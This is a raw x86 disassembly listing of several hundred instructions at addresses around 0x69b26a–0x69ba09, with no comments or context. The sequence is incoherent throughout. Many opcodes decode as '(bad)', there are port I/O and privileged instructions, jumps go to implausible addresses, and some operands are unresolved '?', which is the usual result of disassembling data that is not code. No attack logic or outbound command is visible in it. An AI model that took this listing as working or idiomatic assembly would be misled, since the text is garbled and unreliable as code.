  69b26a:	jb     0x69b271
  69b26c:	push   ds
  69b26d:	cli    
  69b26e:	inc    eax
  69b26f:	ja     0x69b273
  69b271:	test   eax,0xd85a38db
  69b276:	inc    ebp
  69b277:	jle    0x69b2e7
  69b279:	and    ebx,0xffffff84
  69b27c:	imul   esp,DWORD PTR [edx],0x612c33d1
  69b282:	hlt    
  69b283:	(bad)  
  69b284:	push   ebx
  69b285:	pop    esi
  69b286:	push   esi
  69b287:	mov    edi,0x15e9225f
  69b28c:	mov    esp,0x215d1dcb
  69b291:	sub    ecx,esp
  69b293:	sahf   
  69b294:	sub    al,BYTE PTR [edx-0x497ca6bb]
  69b29a:	mov    eax,0x86b19775
  69b29f:	or     dl,bh
  69b2a1:	add    eax,0xf8f6accc
  69b2a6:	test   eax,0x38955f1b
  69b2ab:	mov    cl,0x6b
  69b2ad:	out    dx,eax
  69b2ae:	xor    ebp,ecx
  69b2b0:	imul   edx,DWORD PTR [ecx-0x194d40cb],0xbebeeed5
  69b2ba:	xchg   DWORD PTR [esi+0x20a51373],ecx
  69b2c0:	dec    edi
  69b2c1:	cmp    al,0xdd
  69b2c3:	adc    dh,al
  69b2c5:	jo     0x69b24a
  69b2c7:	call   0xd4c52f05
  69b2cc:	int3   
  69b2cd:	sbb    esp,DWORD PTR [edx+0x7d]
  69b2d0:	(bad)  
  69b2d1:	shl    ebp,1
  69b2d3:	jg     0x69b28a
  69b2d5:	cmc    
  69b2d6:	sbb    al,0x1
  69b2d8:	in     eax,dx
  69b2d9:	sbb    dh,0x8e
  69b2dc:	pop    es
  69b2dd:	mov    ah,0xfa
  69b2df:	fsubr  DWORD PTR [esp+edx*1-0x5ed4010d]
  69b2e6:	aam    0xfb
  69b2e8:	in     al,dx
  69b2e9:	cli    
  69b2ea:	ss pushf 
  69b2ec:	cmp    al,0xec
  69b2ee:	fld    TBYTE PTR [eax]
  69b2f0:	cmp    esi,edi
  69b2f2:	xchg   ebx,eax
  69b2f3:	mov    ebp,0x307aaf86
  69b2f8:	test   DWORD PTR [edi+0x227abcab],edi
  69b2fe:	lock dec esp
  69b300:	fstp   TBYTE PTR [esi]
  69b302:	mov    ebp,DWORD PTR [edx]
  69b304:	mov    eax,ds:0xc7884104
  69b309:	sub    al,0x9d
  69b30b:	mov    BYTE PTR [edi+0x3f],dh
  69b30e:	push   cs
  69b30f:	clc    
  69b310:	add    cl,BYTE PTR [esi+edi*2+0x74]
  69b314:	push   ebp
  69b315:	jl     0x69b372
  69b317:	scas   al,BYTE PTR es:[edi]
  69b318:	adc    BYTE PTR [eax-0x7c],ah
  69b31b:	addr16 jb 0x69b30e
  69b31e:	(bad)  
  69b31f:	aaa    
  69b320:	xlat   BYTE PTR ds:[ebx]
  69b321:	bound  esi,QWORD PTR [ebx+0x2603fb6d]
  69b327:	mov    bh,BYTE PTR [esi-0xfa5b295]
  69b32d:	bound  esp,QWORD PTR [eax]
  69b32f:	pop    ss
  69b330:	iret   
  69b331:	stos   DWORD PTR es:[edi],eax
  69b332:	mov    eax,0x962af4f9
  69b337:	in     al,dx
  69b338:	mov    ecx,0xba91f252
  69b33d:	sahf   
  69b33e:	popf   
  69b33f:	int    0x70
  69b341:	fild   DWORD PTR [ecx-0x80]
  69b344:	mov    esp,0xe3675a9e
  69b349:	xchg   BYTE PTR [ebp+eax*4+0x7d983ab2],ah
  69b350:	mov    al,ds:0x73b97949
  69b355:	std    
  69b356:	push   esp
  69b357:	sub    DWORD PTR [esi+0x70],ecx
  69b35a:	jo     0x69b379
  69b35c:	in     eax,0x78
  69b35e:	cmc    
  69b35f:	outs   dx,DWORD PTR ds:[esi]
  69b360:	mov    ds:0xecba8295,eax
  69b365:	mov    al,0x13
  69b367:	lods   eax,DWORD PTR ds:[esi]
  69b368:	mov    dl,0x50
  69b36a:	pop    esi
  69b36b:	mov    ebx,0xf03edfce
  69b370:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  69b372:	push   0xd
  69b374:	ret    0x6245
  69b377:	into   
  69b378:	xor    DWORD PTR [esi],edi
  69b37a:	mov    edi,0xa12fc4e9
  69b37f:	push   edi
  69b380:	test   DWORD PTR [edi+0x36d3f020],eax
  69b386:	lods   eax,DWORD PTR ds:[esi]
  69b387:	pop    esp
  69b388:	cld    
  69b389:	loopne 0x69b30b
  69b38b:	adc    DWORD PTR [esi-0x5f595bac],edx
  69b391:	bound  ebx,QWORD PTR [ecx+0x7]
  69b394:	jecxz  0x69b3e0
  69b396:	ror    DWORD PTR [ecx],1
  69b398:	loopne 0x69b391
  69b39a:	cdq    
  69b39b:	sub    ebx,0xf292b61
  69b3a1:	shl    DWORD PTR fs:[eax],cl
  69b3a4:	add    BYTE PTR [edi+0x3d],ah
  69b3a7:	in     al,dx
  69b3a8:	push   0x2b35a6e2
  69b3ad:	mov    ebx,esi
  69b3af:	mov    esi,0x28f9249a
  69b3b4:	push   ds
  69b3b5:	xchg   DWORD PTR [ecx],esp
  69b3b7:	aam    0x5d
  69b3b9:	mov    edi,0x78fbdfee
  69b3be:	cmp    al,0xec
  69b3c0:	sub    ch,ch
  69b3c2:	test   DWORD PTR [esi-0x55],ebx
  69b3c5:	lahf   
  69b3c6:	inc    esp
  69b3c7:	mov    ?,WORD PTR [ebp-0x51f3b41e]
  69b3cd:	push   0x64b4ce21
  69b3d2:	enter  0xa14e,0xd
  69b3d6:	sub    DWORD PTR [esi-0x8],ebp
  69b3d9:	mov    eax,ds:0x62ec4f6c
  69b3de:	pushf  
  69b3df:	mov    ds:0x3f708556,eax
  69b3e4:	and    dh,BYTE PTR [edx]
  69b3e6:	xchg   esi,eax
  69b3e7:	push   0xe22307be
  69b3ec:	out    dx,al
  69b3ed:	pop    ebx
  69b3ee:	mov    ebp,0x52c19d36
  69b3f3:	mov    dl,0x69
  69b3f5:	or     al,0xcc
  69b3f7:	cmp    al,0xb1
  69b3fa:	inc    edi
  69b3fb:	rol    BYTE PTR [edx],1
  69b3fd:	cmc    
  69b3fe:	xchg   ebx,eax
  69b3ff:	ficom  WORD PTR [eax-0x92ba4fd]
  69b405:	jmp    0x8864e46e
  69b40a:	arpl   WORD PTR [ebx+0x4d09d21e],bx
  69b410:	sub    eax,0xa3d96238
  69b415:	mov    dl,0x82
  69b417:	das    
  69b418:	stos   DWORD PTR es:[edi],eax
  69b419:	jnp    0x69b3bc
  69b41b:	xchg   ecx,eax
  69b41c:	bswap  ecx
  69b41e:	in     al,0xc4
  69b420:	sub    ch,0x5f
  69b423:	or     BYTE PTR [ebx+0x6f],bh
  69b426:	ins    DWORD PTR es:[edi],dx
  69b427:	rol    DWORD PTR [ecx-0x4a7469f8],1
  69b42d:	push   esp
  69b42e:	jae    0x69b487
  69b430:	pop    ebp
  69b431:	fist   DWORD PTR [eax-0x47]
  69b434:	cld    
  69b435:	mov    edi,0xace6014
  69b43a:	sub    esp,edx
  69b43c:	shr    DWORD PTR [edi],cl
  69b43e:	cdq    
  69b43f:	aas    
  69b440:	es loopne 0x69b481
  69b443:	dec    ecx
  69b444:	lahf   
  69b445:	out    dx,eax
  69b446:	add    al,0x60
  69b448:	mov    ebp,edx
  69b44a:	add    eax,0x2b8f64a7
  69b44f:	cmp    ah,BYTE PTR [esi-0x50]
  69b452:	aad    0x7d
  69b454:	adc    eax,0x406c5900
  69b459:	mov    esp,0x9e7764fb
  69b45e:	cdq    
  69b45f:	xor    BYTE PTR [ecx+0x68],0xfb
  69b463:	sar    BYTE PTR [ebp-0x445ea5cf],1
  69b469:	ins    BYTE PTR es:[edi],dx
  69b46a:	pop    edi
  69b46b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  69b46d:	add    bh,bh
  69b46f:	imul   esi,DWORD PTR [edi-0x2854ac03],0xffffffec
  69b476:	push   edi
  69b477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69b478:	(bad)  
  69b47a:	idiv   BYTE PTR [eax-0x27]
  69b47d:	inc    eax
  69b47e:	mov    edi,0xf10ac147
  69b483:	jae    0x69b409
  69b485:	aas    
  69b486:	inc    esp
  69b487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69b488:	retf   0xf570
  69b48b:	jns    0x69b441
  69b48d:	add    BYTE PTR [ebx+0x52abe97c],0x32
  69b494:	mov    ebp,0x2f868e10
  69b499:	mov    ch,0xa1
  69b49b:	xchg   DWORD PTR [esi-0x2df2e9fa],esp
  69b4a1:	cmp    eax,0x3e346d2c
  69b4a6:	and    eax,0x9d4e982c
  69b4ab:	ret    0x4ef0
  69b4ae:	retf   
  69b4af:	clc    
  69b4b0:	push   edi
  69b4b1:	(bad)  
  69b4b3:	outs   dx,DWORD PTR ds:[esi]
  69b4b4:	sub    esp,DWORD PTR [eax]
  69b4b6:	or     ebp,DWORD PTR [edx]
  69b4b8:	push   esp
  69b4b9:	ret    
  69b4ba:	jp     0x69b48b
  69b4bc:	inc    esi
  69b4bd:	bound  edi,QWORD PTR [ebp+0x4c]
  69b4c0:	imul   esi,DWORD PTR [ecx],0x27
  69b4c3:	jmp    0xc89136f7
  69b4c8:	mov    eax,0x97f37295
  69b4cd:	mov    WORD PTR [edi],?
  69b4cf:	mov    esi,0xa09c5f91
  69b4d4:	outs   dx,DWORD PTR ds:[esi]
  69b4d5:	test   al,0xfa
  69b4d7:	and    dh,dl
  69b4d9:	fsubr  DWORD PTR [ebx-0x7c1a51d9]
  69b4df:	pusha  
  69b4e0:	in     eax,dx
  69b4e1:	dec    ebp
  69b4e2:	std    
  69b4e3:	mov    cl,0x60
  69b4e5:	stc    
  69b4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69b4e7:	or     BYTE PTR [ebx],bh
  69b4e9:	das    
  69b4ea:	xchg   BYTE PTR ds:0xc0d3c5c0,ah
  69b4f0:	pop    ebp
  69b4f1:	and    bl,BYTE PTR [ecx+ebx*8+0x12e0f7ca]
  69b4f8:	jmp    0x36a92f6d
  69b4fd:	and    al,0xcc
  69b4ff:	iret   
  69b500:	stos   BYTE PTR es:[edi],al
  69b501:	ins    BYTE PTR es:[edi],dx
  69b502:	adc    DWORD PTR [edx+0x6f],0x2531a991
  69b509:	inc    esp
  69b50a:	jecxz  0x69b4b8
  69b50c:	pop    ecx
  69b50d:	leave  
  69b50e:	not    DWORD PTR [ebx]
  69b510:	jmp    0x69b4bb
  69b512:	sbb    DWORD PTR [edx-0x366cc412],ecx
  69b518:	or     eax,0x68f5cf02
  69b51d:	inc    ebx
  69b51e:	xchg   ebp,eax
  69b51f:	pop    ds
  69b520:	mov    dl,0xdd
  69b522:	bound  esp,QWORD PTR [ebx+0x5b]
  69b525:	push   ecx
  69b526:	jne    0x69b59c
  69b528:	std    
  69b529:	ins    DWORD PTR es:[edi],dx
  69b52a:	lods   al,BYTE PTR ds:[esi]
  69b52b:	add    eax,0xce872419
  69b530:	dec    eax
  69b531:	xor    al,0xc8
  69b533:	push   ebx
  69b534:	in     al,dx
  69b535:	fisttp DWORD PTR [ecx-0x63a96205]
  69b53b:	inc    esi
  69b53c:	mov    dl,0x3
  69b53e:	shl    DWORD PTR [ebx],cl
  69b540:	arpl   dx,sp
  69b542:	mov    dl,0xd2
  69b544:	mov    dh,0x2d
  69b546:	push   DWORD PTR [edi]
  69b548:	mov    ebx,0x51430fcf
  69b54d:	xor    al,0x24
  69b54f:	xor    ebp,ecx
  69b551:	clc    
  69b552:	int    0x54
  69b554:	and    ebp,DWORD PTR [edx+0xc]
  69b557:	test   DWORD PTR [edx-0x1e],eax
  69b55a:	pusha  
  69b55b:	jmp    0x69b56a
  69b55d:	test   eax,0xbd4bee74
  69b562:	data16 shr ah,cl
  69b565:	pop    ss
  69b566:	call   0x155471bf
  69b56b:	push   ebx
  69b56c:	cmp    ebx,ebp
  69b56e:	push   esi
  69b56f:	inc    ebx
  69b570:	push   cs
  69b571:	dec    esi
  69b572:	pop    ss
  69b573:	sub    esp,DWORD PTR [ebp-0x45830280]
  69b579:	(bad)  
  69b57a:	in     eax,0x6f
  69b57c:	mov    cl,0x40
  69b57e:	ficomp DWORD PTR [eax]
  69b580:	xchg   esi,eax
  69b581:	ja     0x69b54f
  69b583:	cmp    DWORD PTR [eax+0x7f],edi
  69b586:	add    BYTE PTR [ecx+0x40d2f04f],0x46
  69b58d:	jae    0x69b5df
  69b58f:	jmp    0x267685ca
  69b594:	ret    0x3fe4
  69b597:	xor    al,0x76
  69b599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69b59a:	pop    edx
  69b59b:	inc    ebx
  69b59c:	jb     0x69b549
  69b59e:	bound  ecx,QWORD PTR ds:0xe2401053
  69b5a4:	pop    ds
  69b5a5:	div    DWORD PTR ds:0x788eca48
  69b5ab:	ds in  eax,0x25
  69b5ae:	pop    ds
  69b5af:	xchg   BYTE PTR [ecx+eiz*2+0x514ba409],dl
  69b5b6:	stc    
  69b5b7:	dec    eax
  69b5b8:	int    0xf7
  69b5ba:	scas   al,BYTE PTR es:[edi]
  69b5bb:	xor    BYTE PTR ds:0x714f93f7,0xd
  69b5c2:	push   0x3d
  69b5c4:	cmp    DWORD PTR [esi+ecx*4+0x45bc608],esi
  69b5cb:	xor    DWORD PTR [eax],ebx
  69b5cd:	adc    DWORD PTR [ebx],eax
  69b5cf:	lahf   
  69b5d0:	cmp    bl,BYTE PTR [edx]
  69b5d2:	mov    dh,0xca
  69b5d4:	sub    BYTE PTR [ecx+0x16],al
  69b5d7:	ret    
  69b5d8:	ror    BYTE PTR [ebp+0x29],cl
  69b5db:	push   ss
  69b5dc:	sub    BYTE PTR [eax+0x156b473],dl
  69b5e2:	or     al,0xa9
  69b5e4:	xor    ch,dl
  69b5e6:	mov    ds:0xaa3a044e,eax
  69b5eb:	xchg   esi,eax
  69b5ec:	repz test esi,esp
  69b5ef:	push   edx
  69b5f0:	or     eax,eax
  69b5f2:	in     al,0x15
  69b5f4:	(bad)  
  69b5f5:	cmp    ah,ch
  69b5f7:	sbb    eax,0x9d6de349
  69b5fc:	inc    ebx
  69b5fd:	jl     0x69b621
  69b5ff:	loopne 0x69b61f
  69b601:	mov    edx,DWORD PTR [esp+esi*2-0x6ad67f66]
  69b608:	(bad)  
  69b609:	mov    dh,0x0
  69b60b:	lock cmp esp,edi
  69b60e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69b60f:	xchg   edx,eax
  69b610:	cld    
  69b611:	iret   
  69b612:	ret    0x8bc2
  69b615:	push   ss
  69b616:	out    dx,eax
  69b617:	cld    
  69b618:	mov    al,0x7
  69b61a:	pushf  
  69b61b:	adc    bl,BYTE PTR [ebx+0x52a16032]
  69b621:	cmp    eax,0x32160bf7
  69b626:	push   ecx
  69b627:	xchg   DWORD PTR [esi],esi
  69b629:	push   ss
  69b62a:	or     dl,ah
  69b62c:	or     al,0x22
  69b62e:	jge    0x69b5e0
  69b630:	add    BYTE PTR [ebp+0x3d0ea00c],ah
  69b636:	shr    ebx,cl
  69b638:	jp     0x69b68a
  69b63a:	mov    ah,0x5
  69b63c:	mov    al,BYTE PTR [edi+0x40b33b12]
  69b642:	stos   BYTE PTR es:[edi],al
  69b643:	fcmovnu st,st(5)
  69b645:	sub    ah,BYTE PTR [edi]
  69b647:	ret    
  69b648:	mov    BYTE PTR [edi-0x3d],bh
  69b64b:	popa   
  69b64c:	lods   eax,DWORD PTR ds:[esi]
  69b64d:	mov    eax,0x7a274536
  69b652:	mov    ch,0xe0
  69b654:	mov    bh,0x85
  69b656:	mov    ecx,0xd29678a3
  69b65b:	inc    esi
  69b65c:	maxps  xmm0,xmm0
  69b65f:	stos   BYTE PTR es:[edi],al
  69b660:	pop    esp
  69b661:	loopne 0x69b683
  69b663:	dec    ecx
  69b664:	jge    0x69b6c5
  69b666:	mov    ds:0x2e069ef0,al
  69b66b:	mov    ebp,DWORD PTR [ebp+esi*1+0x0]
  69b66f:	fs mov bl,0xcf
  69b672:	fist   WORD PTR [ecx]
  69b674:	mov    bh,0x71
  69b676:	jg     0x69b6e6
  69b678:	sub    eax,0xb031423e
  69b67d:	adc    eax,0x30cecfdd
  69b682:	in     al,dx
  69b683:	imul   al
  69b685:	pop    edi
  69b686:	and    ecx,DWORD PTR [esp+edx*1-0x12]
  69b68a:	out    0x4d,eax
  69b68c:	stos   DWORD PTR es:[edi],eax
  69b68d:	mov    eax,ds:0x258b773f
  69b692:	imul   ecx,DWORD PTR [ebx+0x3f],0xfffffff5
  69b696:	inc    ebp
  69b697:	xor    esp,edx
  69b699:	mov    eax,ecx
  69b69b:	or     BYTE PTR [ebx],dh
  69b69d:	imul   eax,DWORD PTR [bp+si],0x2b
  69b6a1:	fsubr  st(4),st
  69b6a3:	jns    0x69b6d0
  69b6a5:	mov    al,0x71
  69b6a7:	adc    bl,al
  69b6a9:	pop    edi
  69b6aa:	or     dl,dl
  69b6ac:	or     al,0xc6
  69b6ae:	fiadd  DWORD PTR [ecx]
  69b6b0:	and    eax,0x73edfd5c
  69b6b5:	lea    ebp,[ebx]
  69b6b7:	jnp    0x69b694
  69b6b9:	mov    ebx,0xedd020d3
  69b6be:	xor    BYTE PTR [ebx-0x6e9563da],ch
  69b6c4:	xor    esp,DWORD PTR [edi-0x6e]
  69b6c7:	pop    ss
  69b6c8:	ja     0x69b65d
  69b6ca:	in     al,dx
  69b6cb:	div    BYTE PTR [edx-0x48]
  69b6ce:	mov    al,ds:0xc6477ff2
  69b6d3:	fdivp  st(5),st
  69b6d5:	ret    0xa11a
  69b6d8:	mov    DWORD PTR [esi+0x7d],0x568f84b1
  69b6df:	lahf   
  69b6e0:	jae    0x69b716
  69b6e2:	or     BYTE PTR [ebx-0x483be7d9],0xe7
  69b6e9:	(bad)  fs:[ebp-0x7f889845]
  69b6f0:	mov    bh,0xc6
  69b6f2:	add    BYTE PTR [esi-0x61],ah
  69b6f5:	xchg   BYTE PTR [eax-0x24],dh
  69b6f8:	loop   0x69b776
  69b6fa:	mov    eax,ds:0x45e94cb6
  69b6ff:	pop    ebp
  69b700:	and    bh,0xaf
  69b703:	pop    ds
  69b704:	xchg   BYTE PTR [ecx],al
  69b706:	cmp    al,0x49
  69b708:	push   esi
  69b709:	mov    ds,esp
  69b70b:	pushf  
  69b70c:	stc    
  69b70d:	push   esp
  69b70e:	in     eax,0xe5
  69b710:	inc    ebp
  69b711:	sbb    ecx,DWORD PTR ds:0xb1d31634
  69b717:	fnstsw WORD PTR [edi]
  69b719:	mov    WORD PTR [eax+ebp*2-0x6dc95d9a],fs
  69b720:	push   eax
  69b721:	push   0xfffffff5
  69b723:	out    0xdc,eax
  69b725:	leave  
  69b726:	push   0x8eb23d57
  69b72b:	fs jecxz 0x69b724
  69b72e:	scas   al,BYTE PTR es:[edi]
  69b72f:	mov    ss,WORD PTR [ebp+eiz*8-0xe85dbf]
  69b736:	adc    eax,0xd8f57092
  69b73b:	fabs   
  69b73d:	or     al,0x57
  69b73f:	push   0xf3294a3b
  69b744:	pop    ds
  69b745:	cmp    esi,edx
  69b747:	out    0x4,eax
  69b749:	cmp    eax,0x4fd95b7
  69b74e:	mov    bl,0x43
  69b750:	jo     0x69b722
  69b752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69b753:	fld    st(2)
  69b755:	jb     0x69b72a
  69b757:	mov    WORD PTR [edi-0x38],?
  69b75a:	jbe    0x69b761
  69b75c:	dec    eax
  69b75d:	sub    ch,dh
  69b75f:	in     al,0x3f
  69b761:	add    edx,DWORD PTR [eax-0x3eb64697]
  69b767:	mov    ss,WORD PTR [edx+0x4aaa6b76]
  69b76d:	data16 gs mov bl,0xe6
  69b771:	cmp    al,0x33
  69b773:	loope  0x69b7e8
  69b775:	sbb    edx,DWORD PTR [edi]
  69b777:	aaa    
  69b778:	mov    ebx,0x1310ae79
  69b77d:	adc    al,0x13
  69b77f:	cli    
  69b780:	and    al,0xfb
  69b782:	jmp    FWORD PTR [edi]
  69b784:	data16 sbb al,0x79
  69b787:	aam    0xf0
  69b789:	push   0xffffff95
  69b78b:	aam    0xb1
  69b78d:	inc    esi
  69b78e:	dec    esp
  69b78f:	cmp    eax,esp
  69b791:	add    ecx,DWORD PTR [edi+eax*8]
  69b794:	sub    al,BYTE PTR [eax-0x714c01c6]
  69b79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69b79b:	push   esp
  69b79c:	cdq    
  69b79d:	(bad)
  69b7a0:	pop    ebp
  69b7a1:	add    DWORD PTR [eax+0x79601868],edx
  69b7a7:	jle    0x69b78f
  69b7a9:	fisubr DWORD PTR ds:0x335758a5
  69b7af:	popf   
  69b7b0:	jo     0x69b80b
  69b7b2:	ds in  al,0x73
  69b7b5:	inc    esi
  69b7b6:	or     DWORD PTR [eax+0x15763dfb],0xffffffb9
  69b7bd:	ja     0x28e3d4bb
  69b7c3:	xor    eax,0xc772af88
  69b7c8:	dec    ebp
  69b7c9:	jae    0x69b760
  69b7cb:	bndstx [edi],bnd0
  69b7ce:	adc    al,BYTE PTR [ecx]
  69b7d0:	fadd   DWORD PTR [esi-0x3b5920a8]
  69b7d6:	fnstcw WORD PTR [ebp-0x58f6f7a8]
  69b7dc:	mov    bl,BYTE PTR [ebp-0x2d]
  69b7df:	loopne 0x69b855
  69b7e1:	outs   dx,BYTE PTR ds:[esi]
  69b7e2:	loopne 0x69b7a2
  69b7e4:	aad    0x31
  69b7e6:	pop    ebp
  69b7e7:	(bad)  
  69b7e8:	lock popf 
  69b7ea:	add    al,0xc9
  69b7ec:	jecxz  0x69b815
  69b7ee:	aam    0xf7
  69b7f0:	xor    ah,BYTE PTR [esi+0x67]
  69b7f3:	xchg   esp,eax
  69b7f4:	mov    esi,DWORD PTR [eax-0x7d]
  69b7f7:	cmp    esp,DWORD PTR [ecx+0x6d4daa]
  69b7fd:	aad    0x71
  69b7ff:	into   
  69b800:	jg     0x69b827
  69b802:	aam    0x32
  69b804:	(bad)  
  69b805:	in     al,0xcb
  69b807:	stos   DWORD PTR es:[edi],eax
  69b808:	lds    ebp,FWORD PTR [ebp+0x6a]
  69b80b:	arpl   si,cx
  69b80d:	jno    0x69b85c
  69b80f:	jge    0x69b86f
  69b811:	xor    BYTE PTR [eax],dh
  69b813:	imul   eax,DWORD PTR [edi+0xdcd8991],0xa98b4ae4
  69b81d:	sbb    BYTE PTR [edi-0x40132f1f],cl
  69b823:	pop    ebx
  69b824:	xor    edi,DWORD PTR [esi]
  69b826:	pop    esi
  69b827:	idiv   BYTE PTR ds:0x78d472bb
  69b82d:	or     eax,0x7562e2d0
  69b832:	sbb    al,0x23
  69b834:	sbb    dh,BYTE PTR [ebp-0x8aed4b5]
  69b83a:	xchg   BYTE PTR [ebx+eiz*4-0x39392e88],bh
  69b841:	bound  eax,QWORD PTR [edi+eiz*1+0x2c]
  69b845:	inc    ebp
  69b846:	adc    al,0x4f
  69b848:	dec    ebp
  69b849:	push   edx
  69b84a:	sub    DWORD PTR [ebx+0x7b1ce189],ecx
  69b850:	sbb    eax,ebx
  69b852:	add    BYTE PTR [edx-0x5b818736],0x24
  69b859:	pop    edx
  69b85a:	out    0x46,al
  69b85c:	(bad)  
  69b85d:	jecxz  0x69b819
  69b85f:	pop    ebx
  69b860:	xor    eax,0xa428fb9
  69b865:	xchg   DWORD PTR [esi+eiz*8-0x4a56a916],edi
  69b86c:	dec    ebx
  69b86d:	shl    bh,1
  69b86f:	into   
  69b870:	je     0x69b816
  69b872:	stc    
  69b873:	mov    bl,0x41
  69b875:	fild   WORD PTR [ebx-0x70a1b661]
  69b87b:	xchg   ebp,eax
  69b87c:	xchg   esp,eax
  69b87d:	jns    0x69b89b
  69b87f:	ss js  0x69b84a
  69b882:	sbb    DWORD PTR [esi-0x6f],0xb2504084
  69b889:	mov    edi,0x7c20b8ec
  69b88e:	mov    esp,0xb87a5e28
  69b893:	enter  0x842,0x56
  69b897:	jb     0x69b85f
  69b899:	in     eax,0x32
  69b89b:	(bad)  
  69b89c:	in     al,dx
  69b89d:	pop    ebx
  69b89e:	(bad)  
  69b89f:	popf   
  69b8a0:	jae    0x69b868
  69b8a2:	or     edi,DWORD PTR [eax-0x52]
  69b8a5:	mov    BYTE PTR [ebp+0xd41036f],dh
  69b8ab:	adc    BYTE PTR [esi-0x5a0d1cd6],0x20
  69b8b2:	std    
  69b8b3:	jl     0x69b901
  69b8b5:	lock mov al,ds:0xdff327e0
  69b8bb:	fld    TBYTE PTR [ebx]
  69b8bd:	in     al,0x9c
  69b8bf:	xor    BYTE PTR [eax],0x72
  69b8c2:	push   ebp
  69b8c3:	std    
  69b8c4:	cmovno ecx,DWORD PTR [edx+0x3e65a115]
  69b8cb:	cmp    al,al
  69b8cd:	xchg   edi,eax
  69b8ce:	retf   
  69b8cf:	rol    BYTE PTR [eax-0x8],1
  69b8d2:	into   
  69b8d3:	fld    QWORD PTR [ebx]
  69b8d5:	and    al,0xec
  69b8d7:	ret    
  69b8d8:	rdmsr  
  69b8da:	push   ss
  69b8db:	lods   al,BYTE PTR ds:[esi]
  69b8dc:	or     edi,ecx
  69b8de:	div    DWORD PTR [eax-0x68abe338]
  69b8e4:	scas   al,BYTE PTR es:[edi]
  69b8e5:	into   
  69b8e6:	cli    
  69b8e7:	dec    ebp
  69b8e8:	mov    bl,0xf6
  69b8ea:	in     al,dx
  69b8eb:	mov    ecx,0x441e1436
  69b8f0:	fistp  QWORD PTR [ebp-0x52479022]
  69b8f6:	test   DWORD PTR [esi-0x112a2a81],edi
  69b8fc:	adc    ebp,edi
  69b8fe:	test   DWORD PTR [ecx-0x6b],edx
  69b901:	(bad)  
  69b902:	not    DWORD PTR [esi+0x72]
  69b905:	jecxz  0x69b8d0
  69b907:	xchg   esi,eax
  69b908:	(bad)  [edx+0x43d43571]
  69b90e:	sub    BYTE PTR [edi-0x2714ba48],cl
  69b914:	mov    bl,BYTE PTR [ebp+0x50]
  69b917:	sub    BYTE PTR ds:0xe753ec3f,0x28
  69b91e:	or     bl,BYTE PTR [ecx+0x58]
  69b921:	in     al,0x57
  69b923:	pop    edi
  69b924:	pop    ds
  69b925:	clc    
  69b926:	add    al,0x51
  69b928:	and    eax,DWORD PTR [edi]
  69b92a:	ss xchg esi,eax
  69b92c:	cld    
  69b92d:	aad    0xe9
  69b92f:	sub    dl,ah
  69b931:	mov    cl,0xc2
  69b933:	jecxz  0x69b8ef
  69b935:	call   0x9bd1:0x4a911a09
  69b93c:	mov    ah,0x5
  69b93e:	rcl    DWORD PTR [eax+0x467b38a1],cl
  69b944:	jmp    0x69b8e1
  69b946:	push   eax
  69b947:	push   eax
  69b948:	es dec edi
  69b94a:	leave  
  69b94b:	rcl    DWORD PTR ds:0x9c44bd89,1
  69b951:	mov    eax,DWORD PTR [edx-0x384fe8d6]
  69b957:	dec    ecx
  69b958:	aas    
  69b959:	rcr    ebp,1
  69b95b:	retf   0x81d4
  69b95e:	push   0x53
  69b960:	loopne 0x69b93e
  69b962:	cdq    
  69b963:	adc    al,0x80
  69b965:	pop    ss
  69b966:	add    al,0xca
  69b968:	adc    esp,edi
  69b96a:	int3   
  69b96b:	out    dx,al
  69b96c:	push   eax
  69b96d:	inc    esi
  69b96e:	cmp    dh,BYTE PTR [ecx+0x195cee35]
  69b974:	dec    eax
  69b975:	stos   DWORD PTR es:[edi],eax
  69b976:	jecxz  0x69b986
  69b978:	adc    eax,0x10381a7d
  69b97d:	adc    al,0xfa
  69b97f:	call   FWORD PTR [edi-0x79f69234]
  69b985:	jne    0x69b9a6
  69b987:	inc    edi
  69b988:	mov    esp,fs
  69b98a:	and    eax,0x51e2a2d1
  69b98f:	xor    edx,esi
  69b991:	(bad)
  69b994:	jmp    0x5a49:0x3757916b
  69b99b:	call   0x608dde9d
  69b9a0:	cmp    BYTE PTR [edx+0x78d4233f],dh
  69b9a6:	sub    esp,DWORD PTR [eax]
  69b9a8:	ss pop edi
  69b9aa:	in     al,0xdd
  69b9ac:	pop    esp
  69b9ad:	inc    ebx
  69b9ae:	add    BYTE PTR ds:0x34dd6656,dh
  69b9b4:	add    ch,ch
  69b9b6:	pop    ebx
  69b9b7:	pop    esp
  69b9b8:	arpl   WORD PTR [edx],dx
  69b9ba:	dec    ebp
  69b9bb:	xor    edx,DWORD PTR [esi-0x3a]
  69b9be:	push   0x6c
  69b9c0:	arpl   WORD PTR [edi],sp
  69b9c2:	jo     0x69b9e6
  69b9c4:	addr16 retf 
  69b9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69b9c7:	mul    DWORD PTR [ebx-0x6c]
  69b9ca:	xchg   edi,eax
  69b9cb:	xor    DWORD PTR [eax+0x1ede2b4c],esp
  69b9d1:	retf   
  69b9d2:	rcr    bl,0xbd
  69b9d5:	out    0x78,al
  69b9d7:	cmp    eax,0x54446212
  69b9dc:	dec    ecx
  69b9dd:	aaa    
  69b9de:	shl    BYTE PTR [esi-0x6ea7bd80],1
  69b9e4:	popa   
  69b9e5:	in     al,0x2a
  69b9e7:	cmc    
  69b9e8:	xchg   ebx,eax
  69b9e9:	xor    al,0xbb
  69b9eb:	adc    BYTE PTR [ecx],ch
  69b9ed:	inc    eax
  69b9ee:	or     bl,bl
  69b9f0:	pop    ebp
  69b9f1:	es push ecx
  69b9f3:	(bad)  [ecx-0x2b54ccac]
  69b9f9:	dec    esp
  69b9fa:	or     al,0xd5
  69b9fc:	das    
  69b9fd:	leave  
  69b9fe:	dec    esi
  69b9ff:	aad    0x4b
  69ba01:	or     cl,ah
  69ba03:	cwde   
  69ba04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69ba05:	adc    dh,al
  69ba07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69ba08:	das    
  69ba09:	push   edx
